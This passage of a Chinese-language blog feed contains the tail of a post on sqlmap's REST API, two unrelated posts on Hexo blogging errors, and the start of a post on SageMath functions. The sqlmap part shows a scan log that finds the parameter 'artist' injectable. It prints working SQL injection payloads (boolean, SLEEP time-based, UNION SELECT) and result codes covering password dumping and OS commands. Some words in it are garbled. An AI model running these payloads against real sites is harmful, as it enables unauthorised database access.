class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.0 AND err或者-based - WHERE, HAVING, O</span><br><span class=\"line\">RDER BY 或者 GROUP BY clause (FLO或者)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.0 或者 err或者-based - WHERE, HAVING, 或者</span><br><span class=\"line\">DER BY 或者 GROUP BY clause (FLO或者)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.1 AND err或者-based - WHERE, HAVING, O</span><br><span class=\"line\">RDER BY 或者 GROUP BY clause (EXTRACTVALUE)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.1 或者 err或者-based - WHERE, HAVING, 或者</span><br><span class=\"line\">DER BY 或者 GROUP BY clause (EXTRACTVALUE)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.1 AND err或者-based - WHERE, HAVING, O</span><br><span class=\"line\">RDER BY 或者 GROUP BY clause (UPDATEXML)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.1 或者 err或者-based - WHERE, HAVING, 或者</span><br><span class=\"line\">DER BY 或者 GROUP BY clause (UPDATEXML)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 4.1 AND err或者-based - WHERE, HAVING, O</span><br><span class=\"line\">RDER BY 或者 GROUP BY clause (FLO或者)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 4.1 或者 err或者-based - WHERE, HAVING cla</span><br><span class=\"line\">use (FLO或者)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL 或者 err或者-based - WHERE 或者 HAVING clause (</span><br><span class=\"line\">FLO或者)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.1 err或者-based - PROCEDURE ANALYSE (E</span><br><span class=\"line\">XTRACTVALUE)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.5 err或者-based - Parameter replace (B</span><br><span class=\"line\">IGINT UNSIGNED)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.5 err或者-based - Parameter replace (E</span><br><span class=\"line\">XP)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.7.8 err或者-based - Parameter replace </span><br><span class=\"line\">(JSON_KEYS)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.0 err或者-based - Parameter replace (F</span><br><span class=\"line\">LO或者)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.1 err或者-based - Parameter replace (U</span><br><span class=\"line\">PDATEXML)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.1 err或者-based - Parameter replace (E</span><br><span class=\"line\">XTRACTVALUE)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL inline queries&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt; 5.0.11 stacked queries (comment)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt; 5.0.11 stacked queries&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt; 5.0.11 stacked queries (query SLEEP - c</span><br><span class=\"line\">omment)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt; 5.0.11 stacked queries (query SLEEP)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &lt; 5.0.12 stacked queries (heavy query - c</span><br><span class=\"line\">omment)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &lt; 5.0.12 stacked queries (heavy query)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:13&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;GET parameter &#x27;artist&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AN</span><br><span class=\"line\">D time-based blind&#x27; injectable &quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:23&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:23&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;automatically extending ranges f或者 UNION query injection</span><br><span class=\"line\"> technique tests as there is at least one other (potential) technique found&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:23&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;&#x27;或者DER BY&#x27; technique appears to be usable. 这个 should r</span><br><span class=\"line\">educe the time needed to find the right number of query columns. Automatically e</span><br><span class=\"line\">xtending the range f或者 current UNION query injection technique test&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:23&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;target URL appears to have 3 columns in query&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:23&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;GET parameter &#x27;artist&#x27; is &#x27;Generic UNION query (NULL) - </span><br><span class=\"line\">1 to 20 columns&#x27; injectable&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:24&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;the back-end DBMS is MySQL&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:24&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;fetching banner&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:24&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ], </span><br><span class=\"line\">    &quot;success&quot;: true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">api (a42ddaef02e976f0)&gt; data</span><br><span class=\"line\">[12:48:59] [DEBUG] Calling http://192.168.110.1:8775/扫描/a42ddaef02e976f0/data</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;data&quot;: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;status&quot;: 1, </span><br><span class=\"line\">            &quot;type&quot;: 0, </span><br><span class=\"line\">            &quot;value&quot;: [</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    &quot;dbms&quot;: &quot;MySQL&quot;, </span><br><span class=\"line\">                    &quot;suffix&quot;: &quot;&quot;, </span><br><span class=\"line\">                    &quot;clause&quot;: [</span><br><span class=\"line\">                        1, </span><br><span class=\"line\">                        9</span><br><span class=\"line\">                    ], </span><br><span class=\"line\">                    &quot;notes&quot;: [], </span><br><span class=\"line\">                    &quot;ptype&quot;: 1, </span><br><span class=\"line\">                    &quot;dbms_version&quot;: [</span><br><span class=\"line\">                        &quot;&gt;= 5.0.12&quot;</span><br><span class=\"line\">                    ], </span><br><span class=\"line\">                    &quot;prefix&quot;: &quot;&quot;, </span><br><span class=\"line\">                    &quot;place&quot;: &quot;GET&quot;, </span><br><span class=\"line\">                    &quot;os&quot;: null, </span><br><span class=\"line\">                    &quot;conf&quot;: &#123;</span><br><span class=\"line\">                        &quot;code&quot;: null, </span><br><span class=\"line\">                        &quot;string&quot;: &quot;hac&quot;, </span><br><span class=\"line\">                        &quot;notString&quot;: null, </span><br><span class=\"line\">                        &quot;titles&quot;: false, </span><br><span class=\"line\">                        &quot;regexp&quot;: null, </span><br><span class=\"line\">                        &quot;textOnly&quot;: false, </span><br><span class=\"line\">                        &quot;optimize&quot;: false</span><br><span class=\"line\">                    &#125;, </span><br><span class=\"line\">                    &quot;parameter&quot;: &quot;artist&quot;, </span><br><span class=\"line\">                    &quot;data&quot;: &#123;</span><br><span class=\"line\">                        &quot;1&quot;: &#123;</span><br><span class=\"line\">                            &quot;comment&quot;: &quot;&quot;, </span><br><span class=\"line\">                            &quot;matchRatio&quot;: 0.85, </span><br><span class=\"line\">                            &quot;trueCode&quot;: 200, </span><br><span class=\"line\">                            &quot;title&quot;: &quot;AND boolean-based blind - WHERE 或者 HAVING </span><br><span class=\"line\">clause&quot;, </span><br><span class=\"line\">                            &quot;templatePayload&quot;: null, </span><br><span class=\"line\">                            &quot;vect或者&quot;: &quot;AND [INFERENCE]&quot;, </span><br><span class=\"line\">                            &quot;falseCode&quot;: 200, </span><br><span class=\"line\">                            &quot;where&quot;: 1, </span><br><span class=\"line\">                            &quot;payload&quot;: &quot;artist=1 AND 2794=2794&quot;</span><br><span class=\"line\">                        &#125;, </span><br><span class=\"line\">                        &quot;5&quot;: &#123;</span><br><span class=\"line\">                            &quot;comment&quot;: &quot;&quot;, </span><br><span class=\"line\">                            &quot;matchRatio&quot;: 0.85, </span><br><span class=\"line\">                            &quot;trueCode&quot;: 200, </span><br><span class=\"line\">                            &quot;title&quot;: &quot;MySQL &gt;= 5.0.12 AND time-based blind&quot;, </span><br><span class=\"line\">                            &quot;templatePayload&quot;: null, </span><br><span class=\"line\">                            &quot;vect或者&quot;: &quot;AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLE</span><br><span class=\"line\">EPTIME]),[RANDNUM])&quot;, </span><br><span class=\"line\">                            &quot;falseCode&quot;: null, </span><br><span class=\"line\">                            &quot;where&quot;: 1, </span><br><span class=\"line\">                            &quot;payload&quot;: &quot;artist=1 AND SLEEP([SLEEPTIME])&quot;</span><br><span class=\"line\">                        &#125;, </span><br><span class=\"line\">                        &quot;6&quot;: &#123;</span><br><span class=\"line\">                            &quot;comment&quot;: &quot;[GENERIC_SQL_COMMENT]&quot;, </span><br><span class=\"line\">                            &quot;matchRatio&quot;: 0.85, </span><br><span class=\"line\">                            &quot;trueCode&quot;: null, </span><br><span class=\"line\">                            &quot;title&quot;: &quot;Generic UNION query (NULL) - 1 to 20 colum</span><br><span class=\"line\">ns&quot;, </span><br><span class=\"line\">                            &quot;templatePayload&quot;: null, </span><br><span class=\"line\">                            &quot;vect或者&quot;: [</span><br><span class=\"line\">                                2, </span><br><span class=\"line\">                                3, </span><br><span class=\"line\">                                &quot;[GENERIC_SQL_COMMENT]&quot;, </span><br><span class=\"line\">                                &quot;&quot;, </span><br><span class=\"line\">                                &quot;&quot;, </span><br><span class=\"line\">                                &quot;NULL&quot;, </span><br><span class=\"line\">                                2, </span><br><span class=\"line\">                                false, </span><br><span class=\"line\">                                false</span><br><span class=\"line\">                            ], </span><br><span class=\"line\">                            &quot;falseCode&quot;: null, </span><br><span class=\"line\">                            &quot;where&quot;: 2, </span><br><span class=\"line\">                            &quot;payload&quot;: &quot;artist=-5376 UNION ALL SELECT NULL,NULL,</span><br><span class=\"line\">CONCAT(0x716b706a71,0x4a754d495377744d4273616c436b4b6a504164666a5572477241596649</span><br><span class=\"line\">704c68614672644a477474,0x7162717171)-- aAjy&quot;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            ]</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;status&quot;: 1, </span><br><span class=\"line\">            &quot;type&quot;: 2, </span><br><span class=\"line\">            &quot;value&quot;: &quot;5.1.73-0ubuntu0.10.04.1&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ], </span><br><span class=\"line\">    &quot;success&quot;: true, </span><br><span class=\"line\">    &quot;err或者&quot;: []</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">api (a42ddaef02e976f0)&gt; exit</span><br><span class=\"line\">$</span><br></pre></td></tr></table></figure>\n<p>General codes used in response JSON data:</p>\n<ul>\n<li><code>status</code> :</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 - in progress</span><br><span class=\"line\">1 - complete</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>type</code> :</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 - target</span><br><span class=\"line\">1 - techniques</span><br><span class=\"line\">2 - dbms_fingerprint</span><br><span class=\"line\">3 - banner</span><br><span class=\"line\">4 - current_user</span><br><span class=\"line\">5 - current_db</span><br><span class=\"line\">6 - hostname</span><br><span class=\"line\">7 - is_dba</span><br><span class=\"line\">8 - users</span><br><span class=\"line\">9 - passw或者ds</span><br><span class=\"line\">10 - privileges</span><br><span class=\"line\">11 - roles</span><br><span class=\"line\">12 - dbs</span><br><span class=\"line\">13 - tables</span><br><span class=\"line\">14 - columns</span><br><span class=\"line\">15 - schema</span><br><span class=\"line\">16 - count</span><br><span class=\"line\">17 - dump_table</span><br><span class=\"line\">18 - search</span><br><span class=\"line\">19 - sql_query</span><br><span class=\"line\">20 - common_tables</span><br><span class=\"line\">21 - common_columns</span><br><span class=\"line\">22 - file_read</span><br><span class=\"line\">23 - file_write</span><br><span class=\"line\">24 - os_cmd</span><br><span class=\"line\">25 - reg_read</span><br><span class=\"line\">26 - statements</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>returncode</code></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">null - still running</span><br><span class=\"line\">0 - ended gracefully</span><br><span class=\"line\">1 - general err或者 occurred</span><br><span class=\"line\">255 - unhandled exception</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/03/08/%E6%88%91%E5%9C%A8%E4%BD%BF%E7%94%A8hexo%E6%97%B6%E9%81%87%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95/",
            "url": "http://example.com/2024/03/08/%E6%88%91%E5%9C%A8%E4%BD%BF%E7%94%A8hexo%E6%97%B6%E9%81%87%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95/",
            "title": "我在使用hexo时遇见的问题及解决方式记录",
            "date_published": "2024-03-08T05:21:36.000Z",
            "content_html": "<h1 id=\"常用命令\"><a class=\"anchor\" href=\"#常用命令\">#</a> 常用命令</h1>\n<p>我最常用的命令就 3 个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 新建文章</span><br><span class=\"line\">hexo n &quot;文章标题&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 本地生成文章，方便调试修改</span><br><span class=\"line\">hexo s -g</span><br><span class=\"line\"></span><br><span class=\"line\"># 部署文章到网站上</span><br><span class=\"line\">hexo d -g</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"文章标题特殊字符报错\"><a class=\"anchor\" href=\"#文章标题特殊字符报错\">#</a> 文章标题特殊字符报错</h1>\n<p>例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo n &quot;[2024xxxx]xxx&quot;</span><br></pre></td></tr></table></figure>\n<p>报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YAMLException: bad indentation of a mapping entry (1:18)</span><br></pre></td></tr></table></figure>\n<p>原因是标题包含了’[’</p>\n<p>解决方式：双引号换成单引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo n &#x27;[2024xxxx]xxx&#x27;</span><br></pre></td></tr></table></figure>\n<p>虽然本地文件会以 2024xxxx-xxx 命名</p>\n<p>但是页面标题会正确显示 [2024xxxx] xxx</p>\n<h1 id=\"nunjucks-error-xxxx-unexpected-token\"><a class=\"anchor\" href=\"#nunjucks-error-xxxx-unexpected-token\">#</a> Nunjucks Error: xxxx unexpected token: }}</h1>\n<p>写 SSTI 之类的文章时会遇到这样的报错，是因为 hexo 也有渲染引擎</p>\n<p>解决方式：在不想被渲染的文章的 Front-matter 添加一行 disableNunjucks: true</p>\n<h1 id=\"特殊格式被自动解析\"><a class=\"anchor\" href=\"#特殊格式被自动解析\">#</a> 特殊格式被自动解析</h1>\n<p>比如想写 &lt;x&gt;，但是会被解析成<x>(你看不到，因为这就是解析后的结果)，达不到想要的效果</x></p>\n<p>解决方式</p>\n<p>1、&lt;、&gt; 和 x 之间用空格隔开</p>\n<p>2、使用 HTML 编码，比如 &lt;x&gt; 写成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;lt;x&amp;gt;</span><br></pre></td></tr></table></figure>\n<p>markdown 会自动转义</p>\n<p>3、把内容放代码块里</p>\n<p>常见特殊字符的 HTML 编码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">! <span class=\"symbol\">&amp;#33;</span></span><br><span class=\"line\">&quot; <span class=\"symbol\">&amp;#34;</span> <span class=\"symbol\">&amp;quot;</span></span><br><span class=\"line\"># <span class=\"symbol\">&amp;#35;</span></span><br><span class=\"line\">$ <span class=\"symbol\">&amp;#36;</span></span><br><span class=\"line\">% <span class=\"symbol\">&amp;#37;</span></span><br><span class=\"line\">&amp; <span class=\"symbol\">&amp;#38;</span> <span class=\"symbol\">&amp;amp;</span></span><br><span class=\"line\">&#x27; <span class=\"symbol\">&amp;#39;</span></span><br><span class=\"line\">( <span class=\"symbol\">&amp;#40;</span></span><br><span class=\"line\">) <span class=\"symbol\">&amp;#41;</span></span><br><span class=\"line\">* <span class=\"symbol\">&amp;#42;</span></span><br><span class=\"line\">+ <span class=\"symbol\">&amp;#43;</span></span><br><span class=\"line\">&lt; <span class=\"symbol\">&amp;#60;</span> <span class=\"symbol\">&amp;lt;</span></span><br><span class=\"line\">= <span class=\"symbol\">&amp;#61;</span></span><br><span class=\"line\">- <span class=\"symbol\">&amp;#45;</span></span><br><span class=\"line\">&gt; <span class=\"symbol\">&amp;#62;</span> <span class=\"symbol\">&amp;gt;</span></span><br><span class=\"line\">? <span class=\"symbol\">&amp;#63;</span></span><br><span class=\"line\">@ <span class=\"symbol\">&amp;#64;</span></span><br><span class=\"line\">[ <span class=\"symbol\">&amp;#91;</span></span><br><span class=\"line\">\\ <span class=\"symbol\">&amp;#92;</span></span><br><span class=\"line\">] <span class=\"symbol\">&amp;#93;</span></span><br><span class=\"line\">| <span class=\"symbol\">&amp;#124;</span></span><br><span class=\"line\">&#125; <span class=\"symbol\">&amp;#125;</span></span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/03/08/SageMath%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95/",
            "url": "http://example.com/2024/03/08/SageMath%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95/",
            "title": "SageMath常见函数用法",
            "date_published": "2024-03-08T03:42:14.000Z",
            "content_html": "<h1 id=\"solve_mod\"><a class=\"anchor\" href=\"#solve_mod\">#</a> solve_mod</h1>\n<p>作用：解同余方程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x = var(&#x27;x&#x27;)</span><br><span class=\"line\">solve_mod([方程],模数)</span><br></pre></td></tr></table></figure>\n<p>例如</p>\n<p><img data-src=\"SageMath%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95%5C1.png\" alt=\"1\"></p>\n<p>已知<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mo separator=\"true\">,</mo><msub><mi>d</mi><mi>l</mi></msub><mo separator=\"true\">,</mo><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">e,d_l,n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span><span 